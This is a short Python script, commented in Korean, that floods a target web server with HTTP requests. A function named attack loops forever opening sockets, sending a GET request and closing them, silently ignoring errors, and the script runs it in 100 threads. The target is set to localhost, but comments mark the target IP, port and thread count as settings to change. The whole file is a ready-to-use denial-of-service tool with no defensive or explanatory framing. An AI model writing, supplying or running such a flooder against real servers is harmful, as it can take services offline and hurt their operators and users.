import socket
import threading

target = '127.0.0.1'  # 대상 IP
port = 80             # 대상 포트

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % target.encode())
            s.close()
        except Exception as e:
            pass

threads = []
for i in range(100):  # 스레드 수 조절
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)
